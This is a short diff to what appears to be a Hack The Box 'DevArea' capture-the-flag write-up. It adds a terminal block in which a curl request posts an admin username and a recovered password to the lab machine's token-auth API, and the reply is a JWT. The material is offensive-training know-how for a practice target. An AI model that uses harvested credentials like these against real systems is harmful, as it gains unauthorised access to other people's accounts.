@@ -193,3 +193,9 @@ StandardError=journal
 WantedBy=multi-user.target
 ```
 
+```
+ajdev@rootbox:~/HTB/DevArea$ curl -s -X POST http://devarea.htb:8888/api/token-auth \
+-H "Content-Type: application/json" \
+-d '{"username":"admin","password":"O7IJ27MyyXiU"}'
+{"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU5Nzg4MjMsImlhdCI6MTc3NDkzODgyMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.mMwrb0M7U2vM0yfGizMPyLvOPw3SdV4--uDcKfXI4u9h77ZColt_1iV2LdEPEi5LefMOUkn6Jo-UpatQeyCsQQ"}
+```
